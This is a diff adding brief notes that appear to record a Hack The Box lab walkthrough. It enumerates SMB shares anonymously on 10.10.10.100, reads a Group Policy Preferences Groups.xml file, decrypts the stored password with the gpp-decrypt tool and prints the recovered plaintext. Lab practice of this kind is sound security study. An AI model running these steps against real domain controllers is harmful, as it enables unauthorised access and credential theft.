@@ -1,0 +1,13 @@
+
+smbclient -N -L //10.10.10.100 
+
+
+/run/user/1000/gvfs/smb-share:server=10.10.10.100,share=replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE$ cat Pre
+ferences/Groups/Groups.xml
+
+git clone https://github.com/BustedSec/gpp-decrypt
+
+vim gpp-decrypt.rb #to change encrypted string
+
+parallels@ubuntu:~/Desktop/Active/gpp-decrypt$ ruby gpp-decrypt.rb 
+GPPstillStandingStrong2k18
